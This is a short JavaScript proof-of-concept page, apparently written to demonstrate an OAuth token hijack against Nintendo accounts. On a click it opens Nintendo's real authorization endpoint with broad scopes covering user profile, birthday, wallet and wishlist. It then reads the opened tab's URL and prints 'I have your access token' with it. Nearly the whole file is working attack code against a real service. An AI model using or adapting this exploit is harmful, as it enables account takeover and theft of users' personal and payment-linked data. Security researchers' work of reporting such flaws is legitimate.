document.body.innerHTML = '<h5>Click here to hijack token<h5>';

var loading; // Declare 'loading' variable in a broader scope

function handleOnClick() {
  // Open the first URL and close the new tab after 10 seconds
  var newTab = window.open('https://accounts.nintendo.com/connect/1.0.0/authorize?client_id=e56201e414c97a10&display=touch&interacted=1&prompt=consent&redirect_uri=https%3A%2F%2Fen-americas-support.nintendo.com&response_mode=query&response_type=code+id_token+token&scope=eshopAlps+missionStatus+missionStatus%3Aprogress+openid+pointWallet+user+user.birthday+user.links%5B%5D.id+user.mii+user.wishlist+userNotificationMessage%3AanyClients+userNotificationMessage%3AanyClients%3Awrite&state=aa711f14120b3577f3e6063f465ae3d7&web_message_target=op-frame&web_message_uri=https%3A%2F%2Faccounts.nintendo.com');
  setTimeout(function() {
    newTab.close();
  }, 100000000000);

setTimeout(function() {
    document.write('I have your access token: ' + newTab.location.href);
  }, 6000);
}
  
// Attach click event listener to the window object
window.onclick = handleOnClick;